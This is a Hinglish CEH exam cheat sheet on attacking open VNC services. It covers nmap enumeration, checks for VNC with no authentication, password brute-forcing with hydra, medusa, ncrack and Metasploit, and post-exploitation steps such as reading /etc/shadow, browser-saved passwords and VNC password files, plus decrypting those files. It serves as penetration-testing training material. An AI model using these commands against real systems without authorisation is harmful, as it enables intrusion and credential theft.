# VNC PORT OPEN (5900) — Ab Kya Karu?

---

## Pehle Samjho: VNC Kya Hai?

VNC = **Virtual Network Computing**. Ye ek remote desktop protocol hai — matlab doosre computer ka
POORA desktop apne screen pe dikhai deta hai aur tum usse mouse/keyboard se control kar sakte ho.

**Key Facts:**
- Port: **5900 (TCP)** — default VNC port
- Port 5901, 5902, etc. = additional displays (display :1, :2)
- VNC mein **sirf PASSWORD** hota hai — **USERNAME NAHI** hota! (ye SSH/Telnet se alag hai)
- Kuch VNC servers **bina password ke** bhi configured hote hain (no authentication)
- VNC = GUI access milta hai (Graphical Desktop) — command line nahi, poora desktop
- CEH exam mein VNC = **brute force password ya no-auth connect karo → desktop pe flag dhundo**

**Real life analogy:** VNC = kisi ke computer ke saamne baith ke use karna, bas remotely. Screen dikhegi, mouse chalega, keyboard chalega — sab kuch jaise tum wahan ho.

### VNC vs RDP (Remote Desktop Protocol):
| Feature     | VNC (5900)       | RDP (3389)             |
|-------------|------------------|------------------------|
| Platform    | Cross-platform   | Mostly Windows         |
| Auth        | Password only    | Username + Password    |
| Speed       | Slower           | Faster                 |
| Encryption  | Usually none     | Encrypted              |
| Protocol    | Platform-independent | Windows-specific    |

### VNC Port Numbers:
```
Port 5900 = Display :0 (default/main display)
Port 5901 = Display :1
Port 5902 = Display :2
Port 5800 = VNC over HTTP (Java applet, browser access)
```

---

## STEP 1: Confirm VNC Open Hai + Info Gather Karo

```bash
# Basic port check
nmap -sV -p 5900-5910 <IP>

# VNC specific scripts
nmap --script vnc-info -p 5900 <IP>
```

**Output mein kya dekho:**
- `5900/tcp open vnc` — VNC chal raha hai
- Version info: "VNC (protocol 3.8)", "RealVNC", "TightVNC", "UltraVNC"
- **Authentication type** — ye BAHUT important hai:
  - `No authentication` → bina password ke connect ho sakte ho!
  - `VNC Authentication` → password lagega
  - `None + VNC Authentication` → dono options hain

---

## STEP 2: No-Authentication Check (Pehle Ye Try Karo!)

Bahut baar VNC bina password ke configured hota hai:

```bash
# Nmap se check karo
nmap --script vnc-info -p 5900 <IP>

# Output mein dekho:
# "Authentication: None" → NO PASSWORD NEEDED!

# Direct connect karo
vncviewer <IP>:5900

# Agar password poocha → cancel karo, brute force karna padega
# Agar seedha desktop aa gaya → JACKPOT!
```

**Metasploit se no-auth check:**
```bash
msfconsole -q
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <IP>
run
```

**Output mein kya dekho:**
- `VNC server security types includes None` → Bina password ke chal jayega!
- `No authentication required` → Connect karo directly!

---

## STEP 3: VNC Password Brute Force

Agar authentication hai toh password crack karo:

```bash
# Hydra se brute force (RECOMMENDED)
hydra -P /usr/share/wordlists/rockyou.txt <IP> vnc -t 4 -V

# Medusa se
medusa -h <IP> -M vnc -P /usr/share/wordlists/rockyou.txt

# Ncrack se
ncrack -vv -p 5900 --user "" -P /usr/share/wordlists/rockyou.txt <IP>

# Nmap script se
nmap --script vnc-brute -p 5900 <IP>

# Metasploit se
msfconsole -q
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <IP>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

**IMPORTANT VNC Brute Force Notes:**
- VNC mein username NAHI hota — sirf password brute force karo
- Hydra mein `-l` flag mat do (ya empty do) — sirf `-P` chahiye
- `-t 4` = 4 threads (VNC pe zyada threads se ban ho sakte ho)
- `-V` = verbose mode (har attempt dikhega)

**Output mein kya dekho:**
- Hydra: `[5900][vnc] host: <IP> password: password123` → PASSWORD MIL GAYA!
- Nmap: `Valid credentials: password123` → ye password hai

### Common VNC Passwords (Pehle Ye Try Karo):
| Password    | Kab milta hai              |
|-------------|---------------------------|
| password    | Generic/default           |
| 123456      | Lazy admins               |
| vnc         | VNC-specific default      |
| admin       | Common default            |
| test        | Lab environments          |
| (empty)     | No password set           |

---

## STEP 4: VNC Se Connect Karo

Password mil gaya ya no-auth hai? Ab connect karo:

### Method 1: vncviewer (Command Line)
```bash
# Basic connect
vncviewer <IP>:5900
# Password prompt aayega → password daalo

# Agar display number pata hai
vncviewer <IP>::5901    # display :1

# Full screen mode
vncviewer -fullscreen <IP>:5900
```

### Method 2: Remmina (GUI Tool — Kali mein pre-installed)
```
1. Remmina kholo
2. Connection type: "VNC" select karo
3. Server: <IP>:5900
4. Password daalo
5. Connect!
```

### Method 3: xvnc4viewer
```bash
xvnc4viewer <IP>:5900
```

### Method 4: Browser (agar port 5800 open hai)
```
Browser mein jaao: http://<IP>:5800
Java applet load hoga → VNC desktop dikhega
```

**Connection ke baad:**
- Remote computer ka POORA desktop dikhega
- Mouse aur keyboard se control kar sakte ho
- Basically tum us computer ke saamne baithe ho!

---

## STEP 5: Post-Exploit — Desktop Pe Kya Karna Hai

VNC se connect hone ke baad GUI desktop milega. Ab:

### Linux Desktop Pe:
```
1. Terminal kholo (right-click desktop → Terminal/Shell)
2. Terminal mein commands chalao:
   whoami
   id
   cat /root/flag.txt
   find / -name "flag*" 2>/dev/null
   cat /etc/passwd
   cat /etc/shadow

3. Desktop pe files check karo:
   - Desktop folder mein flag.txt ya important files
   - Home directory mein documents
   - File manager khol ke browse karo

4. Browser check karo:
   - Bookmarks mein kuch hai?
   - Browser history mein sensitive URLs?
   - Saved passwords?
```

### Windows Desktop Pe:
```
1. Command Prompt kholo (Start → cmd)
2. Commands chalao:
   whoami
   ipconfig
   net user
   type C:\Users\Administrator\Desktop\flag.txt
   dir /s /b C:\Users\*flag*

3. Desktop pe files check karo:
   - Desktop icons
   - Documents folder
   - Downloads folder
   - Recycle Bin (kabhi kabhi delete ki hui files wahan hoti hain!)

4. Other checks:
   - Sticky Notes (kabhi kabhi passwords likhte hain log)
   - Notepad open files
   - Browser saved passwords
```

**IMPORTANT:** VNC = GUI access. Toh screenshot lena easy hai (exam mein proof ke liye).
Kali mein `screenshot` ya `scrot` command se screenshot le lo.

---

## STEP 6: VNC Password File Decrypt

Kabhi kabhi target pe VNC ki password file milti hai:

```bash
# Linux pe VNC password file locations:
cat ~/.vnc/passwd
cat /etc/vnc/passwd
cat /root/.vnc/passwd

# Windows pe:
# Registry: HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver\Password
# File: C:\Program Files\RealVNC\VNC4\passwd
```

**VNC password decrypt karo:**
```bash
# Metasploit module
msfconsole -q
use post/multi/gather/vnc_decrypt
# ya
irb
require 'rex/proto/rfb/cipher'
Rex::Proto::RFB::Cipher.decrypt_password(["ENCRYPTED_HEX_HERE"].pack('H*'))

# Online tools bhi hain — "VNC password decoder" search karo
# vncpasswd.py tool:
vncpasswd.py -d -f /path/to/vnc/passwd
```

---

## Common Mistakes (Mat Karna Ye)

1. **VNC mein username dene ki koshish** — VNC mein USERNAME NAHI hota! Sirf password. Hydra mein `-l` flag mat lagao ya empty rakhho.

2. **Port 5900 ke baad ke ports check nahi kiye** — 5901, 5902 pe bhi VNC ho sakta hai. `nmap -p 5900-5910 <IP>` karo.

3. **No-auth check nahi kiya seedha brute force shuru kar diya** — Pehle check karo ki password hai bhi ya nahi! Bahut baar VNC bina password ke hota hai.

4. **Connect hua but kuch dikh nahi raha (black screen)** — Screen resolution issue ho sakta hai. Resize karo ya `-geometry 1024x768` flag use karo.

5. **Brute force mein bahut zyada threads** — VNC slow hai, `-t 4` se zyada mat do. Nahi toh connection drop hoga ya ban ho jaoge.

6. **Desktop pe flag dhunda nahi** — VNC = GUI access. Terminal kholo, files dhundo. Desktop pe right-click karo, file manager kholo. Har jagah dekho!

7. **VNC password file mili but decrypt nahi kiya** — VNC passwords weakly encrypted hote hain. Metasploit ya online tools se easily decrypt hote hain.

---

## Quick Decision Tree

```
Port 5900 Open (VNC) hai?
|
+-- Pehle info gather karo
|   nmap --script vnc-info -p 5900 <IP>
|   |
|   +-- "No authentication" dikha?
|   |   |
|   |   +-- YES --> Direct connect karo!
|   |   |          vncviewer <IP>:5900
|   |   |          Desktop mil jayega --> flag dhundo
|   |   |
|   |   +-- NO --> Password chahiye, brute force karo
|   |
+-- Password Brute Force
|   hydra -P /usr/share/wordlists/rockyou.txt <IP> vnc -t 4
|   |
|   +-- Password mila?
|   |   |
|   |   +-- YES --> vncviewer <IP>:5900
|   |   |          Password daalo --> Desktop access!
|   |   |
|   |   +-- NO --> Smaller wordlist try karo
|   |              nmap --script vnc-brute karo
|   |              Metasploit vnc_login try karo
|   |
+-- Desktop Access Mil Gaya!
|   |
|   +-- Linux hai?
|   |   Terminal kholo --> whoami, cat /root/flag.txt
|   |   Desktop pe files check karo
|   |   find / -name "flag*" 2>/dev/null
|   |
|   +-- Windows hai?
|       cmd kholo --> whoami, type Desktop\flag.txt
|       Desktop, Documents, Downloads check karo
|       Sticky Notes, Browser passwords dekho
```
